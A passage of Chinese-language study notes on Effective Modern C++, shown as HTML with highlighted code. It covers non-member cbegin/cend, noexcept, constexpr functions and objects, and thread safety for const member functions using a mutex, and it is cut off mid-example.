class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; values;                                <span class="hljs-comment">//和之前一样</span><br>…<br><span class="hljs-keyword">auto</span> it =                                               <span class="hljs-comment">//使用cbegin</span><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">find</span>(values.cbegin(), values.cend(), <span class="hljs-number">1983</span>);    <span class="hljs-comment">//和cend</span><br>values.insert(it, <span class="hljs-number">1998</span>);<br></code></pre></div></td></tr></table></figure><p>C++11 的一个缺陷是，对于 非成员函数，没有类似的 cbegin，cend函数支持。C++14补上了这一空白。</p><p>非成员函数也叫 自由函数<em>freefunction</em>，即一个函数，只要不是成员函数就可被称作<em>freefunction</em>。</p><p>举个例子，我们可以泛化下面的<code>findAndInsert</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> C, <span class="hljs-keyword">typename</span> V&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">findAndInsert</span><span class="hljs-params">(C&amp; container,            <span class="hljs-comment">//在容器中查找第一次</span></span></span><br><span class="hljs-function"><span class="hljs-params">                   <span class="hljs-keyword">const</span> V&amp; targetVal,      <span class="hljs-comment">//出现targetVal的位置，</span></span></span><br><span class="hljs-function"><span class="hljs-params">                   <span class="hljs-keyword">const</span> V&amp; insertVal)</span>      <span class="hljs-comment">//然后在那插入insertVal</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">using</span> <span class="hljs-built_in">std</span>::cbegin;<br>    <span class="hljs-keyword">using</span> <span class="hljs-built_in">std</span>::cend;<br><br>    <span class="hljs-keyword">auto</span> it = <span class="hljs-built_in">std</span>::find(cbegin(container),  <span class="hljs-comment">//非成员函数cbegin</span><br>                        cend(container),    <span class="hljs-comment">//非成员函数cend</span><br>                        targetVal);<br>    container.insert(it, insertVal);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>它可以在C++14工作良好，但是很遗憾，C++11不在良好之列。</p><p>如果你使用C++11，并且想写一个最大程度通用的代码，而你使用的STL没有提供缺失的非成员函数<code>cbegin</code>，你可以简单的写下你自己的实现。比如，下面就是非成员函数<code>cbegin</code>的实现：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">auto</span> <span class="hljs-title">cbegin</span>(<span class="hljs-title">const</span> <span class="hljs-title">C</span>&amp; <span class="hljs-title">container</span>)-&gt;<span class="hljs-title">decltype</span>(<span class="hljs-title">std</span>:</span>:begin(container)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::begin(container);   <span class="hljs-comment">//解释见下</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="结论">结论</span></h3><ul><li>优先考虑<code>const_iterator</code>而非<code>iterator</code></li><li>在最大程度通用的代码中，优先考虑非成员函数版本的<code>begin</code>，<code>end</code>，<code>rbegin</code>等，而非同名成员函数</li></ul><h2><span id="14如果函数不抛出异常请使用noexcept">14如果函数不抛出异常请使用<code>noexcept</code></span></h2><p>调用者可以查看函数是否声明为<code>noexcept</code>，这个可以影响到调用代码的异常安全性（<em>exceptionsafety</em>）和效率。就其本身而言，函数是否为<code>noexcept</code>和成员函数是否<code>const</code>一样重要。当你知道这个函数不会抛异常而没加上<code>noexcept</code>，那这个接口说明就有点差劲了。</p><p><code>noexcept</code> 允许编译器生成更好的目标代码。</p><p>两种表达方式如下：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> <span class="hljs-title">throw</span><span class="hljs-params">()</span></span>;   <span class="hljs-comment">//C++98风格，没有来自f的异常</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> <span class="hljs-keyword">noexcept</span></span>;  <span class="hljs-comment">//C++11风格，没有来自f的异常</span><br></code></pre></div></td></tr></table></figure><p>如果在运行时，<code>f</code>出现一个异常，那么就和<code>f</code>的异常说明冲突了。在C++98的异常说明中，调用栈（the<em>callstack</em>）会展开至<code>f</code>的调用者，在一些与这地方不相关的动作后，程序被终止。C++11异常说明的运行时行为有些不同：调用栈只是<strong>可能</strong>在程序终止前展开。</p><p>展开调用栈和<strong>可能</strong>展开调用栈两者对于代码生成（codegeneration）有非常大的影响。在一个<code>noexcept</code>函数中，当异常可能传播到函数外时，优化器不需要保证运行时栈（theruntimestack）处于可展开状态；也不需要保证当异常离开<code>noexcept</code>函数时，<code>noexcept</code>函数中的对象按照构造的反序析构。而标注“<code>throw()</code>”异常声明的函数缺少这样的优化灵活性，没加异常声明的函数也一样。可以总结一下：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">RetType <span class="hljs-title">function</span><span class="hljs-params">(params)</span> <span class="hljs-keyword">noexcept</span></span>;  <span class="hljs-comment">//极尽所能优化</span><br><span class="hljs-function">RetType <span class="hljs-title">function</span><span class="hljs-params">(params)</span> <span class="hljs-title">throw</span><span class="hljs-params">()</span></span>;   <span class="hljs-comment">//较少优化</span><br><span class="hljs-function">RetType <span class="hljs-title">function</span><span class="hljs-params">(params)</span></span>;           <span class="hljs-comment">//较少优化</span><br></code></pre></div></td></tr></table></figure><p>这是一个充分的理由使得你当知道它不抛异常时加上<code>noexcept</code>。</p><p>另外对于一些容器数据结构的构造，如果可以就移动，如果必要则复制。对于这个函数只有在知晓移动不抛异常的情况下用C++11的移动操作替换C++98的复制操作才是安全的。</p><p>但是如何知道一个函数中的移动操作是否产生异常？答案很明显：它检查这个操作是否被声明为<code>noexcept</code>。</p><p>像是 <code>std::vector::push_back</code>之类的函数调用<code>std::move_if_noexcept</code>，这是个<code>std::move</code>的变体，根据其中类型的移动构造函数是否为<code>noexcept</code>的.<code>std::move_if_noexcept</code>查阅<code>std::is_nothrow_move_constructible</code>这个<em>typetrait</em>.</p><p><code>swap</code>函数是<code>noexcept</code>的另一个绝佳用地。<code>swap</code>是STL算法实现的一个关键组件，它也常用于拷贝运算符重载中。它的广泛使用意味着对其施加不抛异常的优化是非常有价值的。有趣的是，标准库的<code>swap</code>是否<code>noexcept</code>有时依赖于用户定义的<code>swap</code>是否<code>noexcept</code>。比如，数组和<code>std::pair</code>的<code>swap</code>声明如下：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>, <span class="hljs-title">size_t</span> <span class="hljs-title">N</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">void</span> <span class="hljs-title">swap</span>(<span class="hljs-title">T</span> (&amp;<span class="hljs-title">a</span>)[<span class="hljs-title">N</span>],</span><br><span class="hljs-class">          <span class="hljs-title">T</span> (&amp;<span class="hljs-title">b</span>)[<span class="hljs-title">N</span>]) <span class="hljs-title">noexcept</span>(<span class="hljs-title">noexcept</span>(<span class="hljs-title">swap</span>(*<span class="hljs-title">a</span>, *<span class="hljs-title">b</span>)));</span>  <span class="hljs-comment">//见下文</span><br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T1</span>, <span class="hljs-title">class</span> <span class="hljs-title">T2</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">struct</span> <span class="hljs-title">pair</span> &#123;</span><br>    …<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(pair&amp; p)</span> <span class="hljs-title">noexcept</span><span class="hljs-params">(<span class="hljs-keyword">noexcept</span>(swap(first, p.first)) &amp;&amp;</span></span><br><span class="hljs-function"><span class="hljs-params">                                <span class="hljs-keyword">noexcept</span>(swap(second, p.second)))</span></span>;<br>    …<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>这些函数视情况<code>noexcept</code>：它们是否<code>noexcept</code>依赖于<code>noexcept</code>声明中的表达式是否<code>noexcept</code>。</p><p>一些函数很自然的不应该抛异常，尤其是移动操作和<code>swap</code>。使其<code>noexcept</code>有重大意义，只要可能就应该将它们实现为<code>noexcept</code>。</p><p>对于一些函数，使其成为<code>noexcept</code>是很重要的，它们应当默认如是。在C++98，允许内存释放（memorydeallocation）函数（即<code>operator delete</code>和<code>operator delete[]</code>）和析构函数抛出异常是糟糕的代码设计，C++11将这种作风升级为语言规则。</p><p>默认情况下，内存释放函数和析构函数——不管是用户定义的还是编译器生成的——都是隐式<code>noexcept</code>。因此它们不需要声明<code>noexcept</code>。</p><p>析构函数非隐式<code>noexcept</code>的情况仅当类的数据成员（包括继承的成员还有继承成员内的数据成员）明确声明它的析构函数可能抛出异常（如声明“<code>noexcept(false)</code>”）。</p><p>如果一个对象的析构函数可能被标准库使用（比如在容器内或者被传给一个算法），析构函数又可能抛异常，那么程序的行为是未定义的。</p><p>有时候, 一些库函数, C++98的函数, 即使是决不抛出异常的, 也没有标识为<code>noexcept</code>.因为从C标准库移动到了<code>std</code>命名空间，也可能缺少异常规范，<code>std::strlen</code>就是一个例子，它没有声明<code>noexcept</code>.另外C++98异常规范和C++11不同.</p><h3><span id="结论">结论</span></h3><ul><li><code>noexcept</code>是函数接口的一部分，这意味着调用者可能会依赖它</li><li><code>noexcept</code>函数较之于non-<code>noexcept</code>函数更容易优化</li><li><code>noexcept</code>对于移动语义，<code>swap</code>，内存释放函数和析构函数非常有用</li><li>大多数函数是异常中立的（可能抛也可能不抛异常）而不是<code>noexcept</code></li></ul><h2><span id="15-尽量使用-constexpr">15 尽量使用 <code>constexpr</code></span></h2><p>从概念上来说，<code>constexpr</code>表明一个值不仅仅是常量，还是编译期可知的。这个表述并不全面，因为当<code>constexpr</code>被用于函数的时候，事情就有一些细微差别了。</p><p>但是，并不能保证<code>constexpr</code>函数的结果是<code>const</code>，也不能保证它们的返回值是在编译期可知的。</p><p>和<code>const</code>一样，<code>constexpr</code>是编译期可知的。技术上来讲，它们的值在翻译期（translation）决议，所谓翻译（translation）不仅仅包含是编译（compilation）也包含链接（linking）。</p><p>编译期可知的值“享有特权”，它们可能被存放到只读存储空间中。对于那些嵌入式系统的开发者，这个特性是相当重要的。更广泛的应用是“其值编译期可知” 的常量整数会出现在需要“整型常量表达式（<strong>integral constantexpression</strong>）的上下文中：包括数组大小，整数模板参数（包括<code>std::array</code>对象的长度），枚举名的值，对齐修饰符（<a href="https://en.cppreference.com/w/cpp/language/alignas"><code>alignas(val)</code></a>），等等。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> sz;                             <span class="hljs-comment">//non-constexpr变量</span><br>…<br><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">auto</span> arraySize1 = sz;     <span class="hljs-comment">//错误！sz的值在</span><br>                                    <span class="hljs-comment">//编译期不可知</span><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">int</span>, sz&gt; data1;          <span class="hljs-comment">//错误！一样的问题</span><br><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">auto</span> arraySize2 = <span class="hljs-number">10</span>;     <span class="hljs-comment">//没问题，10是</span><br>                                    <span class="hljs-comment">//编译期可知常量</span><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">int</span>, arraySize2&gt; data2;  <span class="hljs-comment">//没问题, arraySize2是constexpr</span><br></code></pre></div></td></tr></table></figure><p>注意<code>const</code>不提供<code>constexpr</code>所能保证之事，因为<code>const</code>对象不需要在编译期初始化它的值。</p><p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> sz;                            <br>…<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> arraySize = sz;         <span class="hljs-comment">//没问题，arraySize是sz的const复制</span><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">int</span>, arraySize&gt; data;   <span class="hljs-comment">//错误，arraySize值在编译期不可知</span><br></code></pre></div></td></tr></table></figure></p><p>简而言之，所有<code>constexpr</code>对象都是<code>const</code>，但不是所有<code>const</code>对象都是<code>constexpr</code>。如果你想编译器保证一个变量有一个值，这个值可以放到那些需要编译期常量（compile-timeconstants）的上下文的地方，你需要的工具是<code>constexpr</code>而不是<code>const</code>。</p><p>注意，I/O语句一般不被允许出现在<code>constexpr</code>函数里。</p><h3><span id="constexpr-限制">constexpr 限制</span></h3><p>因为<code>constexpr</code>函数必须能在编译期值调用的时候返回编译期结果，就必须对它的实现施加一些限制。这些限制在C++11和C++14标准间有所出入。</p><p>C++11中，<code>constexpr</code>函数的代码不超过一行语句：一个<code>return</code>。听起来很受限，但实际上有两个技巧可以扩展<code>constexpr</code>函数的表达能力。第一，使用三元运算符“<code>?:</code>”来代替<code>if</code>-<code>else</code>语句，第二，使用递归代替循环。因此<code>pow</code>可以像这样实现：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">int</span> <span class="hljs-title">pow</span><span class="hljs-params">(<span class="hljs-keyword">int</span> base, <span class="hljs-keyword">int</span> <span class="hljs-built_in">exp</span>)</span> <span class="hljs-keyword">noexcept</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exp</span> == <span class="hljs-number">0</span> ? <span class="hljs-number">1</span> : base * <span class="hljs-built_in">pow</span>(base, <span class="hljs-built_in">exp</span> - <span class="hljs-number">1</span>));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在C++11中，有两个限制使得<code>Point</code>的成员函数<code>setX</code>和<code>setY</code>不能声明为<code>constexpr</code>。第一，它们修改它们操作的对象的状态，并且在C++11中，<code>constexpr</code>成员函数是隐式的<code>const</code>。第二，它们有<code>void</code>返回类型，<code>void</code>类型不是C++11中的字面值类型。这两个限制在C++14中放开了，所以C++14中<code>Point</code>的<em>setter</em>（赋值器）也能声明为<code>constexpr</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Point</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    …<br>    <span class="hljs-function"><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setX</span><span class="hljs-params">(<span class="hljs-keyword">double</span> newX)</span> <span class="hljs-keyword">noexcept</span> </span>&#123; x = newX; &#125; <span class="hljs-comment">//C++14</span><br>    <span class="hljs-function"><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setY</span><span class="hljs-params">(<span class="hljs-keyword">double</span> newY)</span> <span class="hljs-keyword">noexcept</span> </span>&#123; y = newY; &#125; <span class="hljs-comment">//C++14</span><br>    …<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>现在也能写这样的函数：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">//返回p相对于原点的镜像</span><br><span class="hljs-function"><span class="hljs-keyword">constexpr</span> Point <span class="hljs-title">reflection</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Point&amp; p)</span> <span class="hljs-keyword">noexcept</span></span><br><span class="hljs-function"></span>&#123;<br>    Point result;                   <span class="hljs-comment">//创建non-const Point</span><br>    result.setX(-p.xValue());       <span class="hljs-comment">//设定它的x和y值</span><br>    result.setY(-p.yValue());<br>    <span class="hljs-keyword">return</span> result;                  <span class="hljs-comment">//返回它的副本</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="c14-constexpr">C++14 constexpr</span></h3><p>在C++14中，<code>constexpr</code>函数的限制变得非常宽松了，所以下面的函数实现成为了可能：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">int</span> <span class="hljs-title">pow</span><span class="hljs-params">(<span class="hljs-keyword">int</span> base, <span class="hljs-keyword">int</span> <span class="hljs-built_in">exp</span>)</span> <span class="hljs-keyword">noexcept</span>   <span class="hljs-comment">//C++14</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">auto</span> result = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">exp</span>; ++i) result *= base;<br>    <br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><code>constexpr</code>函数限制为只能获取和返回<strong>字面值类型</strong>，这基本上意味着那些有了值的类型能在编译期决定。在C++11中，除了<code>void</code>外的所有内置类型，以及一些用户定义类型都可以是字面值类型，因为构造函数和其他成员函数可能是<code>constexpr</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Point</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">constexpr</span> <span class="hljs-title">Point</span><span class="hljs-params">(<span class="hljs-keyword">double</span> xVal = <span class="hljs-number">0</span>, <span class="hljs-keyword">double</span> yVal = <span class="hljs-number">0</span>)</span> <span class="hljs-keyword">noexcept</span></span><br>    : x(xVal), y(yVal)<br>    &#123;&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">double</span> <span class="hljs-title">xValue</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">noexcept</span> </span>&#123; <span class="hljs-keyword">return</span> x; &#125; <br>    <span class="hljs-function"><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">double</span> <span class="hljs-title">yValue</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">noexcept</span> </span>&#123; <span class="hljs-keyword">return</span> y; &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setX</span><span class="hljs-params">(<span class="hljs-keyword">double</span> newX)</span> <span class="hljs-keyword">noexcept</span> </span>&#123; x = newX; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setY</span><span class="hljs-params">(<span class="hljs-keyword">double</span> newY)</span> <span class="hljs-keyword">noexcept</span> </span>&#123; y = newY; &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">double</span> x, y;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p><code>Point</code>的构造函数可被声明为<code>constexpr</code>，因为如果传入的参数在编译期可知，<code>Point</code>的数据成员也能在编译器可知。因此这样初始化的<code>Point</code>就能为<code>constexpr</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">constexpr</span> Point <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">9.4</span>, <span class="hljs-number">27.7</span>)</span></span>;  <span class="hljs-comment">//没问题，constexpr构造函数</span><br>                                <span class="hljs-comment">//会在编译期“运行”</span><br><span class="hljs-function"><span class="hljs-keyword">constexpr</span> Point <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-number">28.8</span>, <span class="hljs-number">5.3</span>)</span></span>;  <span class="hljs-comment">//也没问题</span><br></code></pre></div></td></tr></table></figure><p>类似的，<code>xValue</code>和<code>yValue</code>的<em>getter</em>（取值器）函数也能是<code>constexpr</code>，因为如果对一个编译期已知的<code>Point</code>对象（如一个<code>constexpr</code><code>Point</code>对象）调用<em>getter</em>，数据成员<code>x</code>和<code>y</code>的值也能在编译期知道。这使得我们可以写一个<code>constexpr</code>函数，里面调用<code>Point</code>的<em>getter</em>并初始化<code>constexpr</code>的对象：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">constexpr</span><br><span class="hljs-function">Point <span class="hljs-title">midpoint</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Point&amp; p1, <span class="hljs-keyword">const</span> Point&amp; p2)</span> <span class="hljs-keyword">noexcept</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> &#123; (p1.xValue() + p2.xValue()) / <span class="hljs-number">2</span>,   <span class="hljs-comment">//调用constexpr</span><br>             (p1.yValue() + p2.yValue()) / <span class="hljs-number">2</span> &#125;; <span class="hljs-comment">//成员函数</span><br>&#125;<br><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">auto</span> mid = midpoint(p1, p2);      <span class="hljs-comment">//使用constexpr函数的结果</span><br>                                            <span class="hljs-comment">//初始化constexpr对象</span><br></code></pre></div></td></tr></table></figure><p><code>mid</code>对象通过调用构造函数，<em>getter</em>和非成员函数来进行初始化过程就能在只读内存中被创建出来。</p><p><code>constexpr</code>对象和<code>constexpr</code>函数可以使用的范围比non-<code>constexpr</code>对象和函数大得多。使用<code>constexpr</code>关键字可以最大化你的对象和函数可以使用的场景。</p><p>还有个重要的需要注意的是<code>constexpr</code>是对象和函数接口的一部分。加上<code>constexpr</code>相当于宣称“我能被用在C++要求常量表达式的地方”。</p><h3><span id="结论">结论</span></h3><ul><li><code>constexpr</code>对象是<code>const</code>，它被在编译期可知的值初始化</li><li>当传递编译期可知的值时，<code>constexpr</code>函数可以产出编译期可知的结果</li><li><code>constexpr</code>对象和函数可以使用的范围比non-<code>constexpr</code>对象和函数要大</li><li><code>constexpr</code>是对象和函数接口的一部分</li></ul><h2><span id="16-让-const成员函数线程安全">16 让 <code>const</code>成员函数线程安全</span></h2><p>考虑下面的例子，计算多项式的根，多项式的根在多项式确定时，根一般是确定的，声明为<code>const</code> 。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Polynomial</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">using</span> RootsType = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">double</span>&gt;;<br>    <br>    <span class="hljs-function">RootsType <span class="hljs-title">roots</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!rootsAreValid) &#123;               <span class="hljs-comment">//如果缓存不可用</span><br>            …                               <span class="hljs-comment">//计算根</span><br>                                            <span class="hljs-comment">//用rootVals存储它们</span><br>            rootsAreValid = <span class="hljs-literal">true</span>;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> rootVals;<br>    &#125;<br>    <br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">mutable</span> <span class="hljs-keyword">bool</span> rootsAreValid&#123; <span class="hljs-literal">false</span> &#125;;    <span class="hljs-comment">//初始化器（initializer）的</span><br>    <span class="hljs-keyword">mutable</span> RootsType rootVals&#123;&#125;;           <br>&#125;;<br></code></pre></div></td></tr></table></figure><p><code>roots</code>是<code>const</code>成员函数，那就表示着它是一个读操作。在没有同步的情况下，让多个线程执行读操作是安全的。</p><p>但是，在<code>roots</code>中，这些线程中的一个或两个可能尝试修改成员变量<code>rootsAreValid</code>和<code>rootVals</code>。这就意味着在没有同步的情况下，这些代码会有不同的线程读写相同的内存，这就是数据竞争（<em>datarace</em>）的定义。这段代码的行为是未定义的。</p><p>问题就是<code>roots</code>被声明为<code>const</code>，但不是线程安全的。</p><p>解决这个问题最普遍简单的方法就是——使用<code>mutex</code>（互斥量）：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Polynomial</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">using</span> RootsType = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">double</span>&gt;;<br>    <br>    <span class="hljs-function">RootsType <span class="hljs-title">roots</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-function"><span class="hljs-built_in">std</span>::lock_guard&lt;<span class="hljs-built_in">std</span>::mutex&gt; <span class="hljs-title">g</span><span class="hljs-params">(m)</span></span>;       <span class="hljs-comment">//锁定互斥量</span><br>        <br>        <span class="hljs-keyword">if</span> (!rootsAreValid) &#123;                   <span class="hljs-comment">//如果缓存无效</span><br>            …                                   <span class="hljs-comment">//计算/存储根值</span><br>            rootsAreValid = <span class="hljs-literal">true</span>;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> rootsVals;<br>    &#125;                                           <span class="hljs-comment">//解锁互斥量</span><br>    <br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">mutable</span> <span class="hljs-built_in">std</span>::mutex 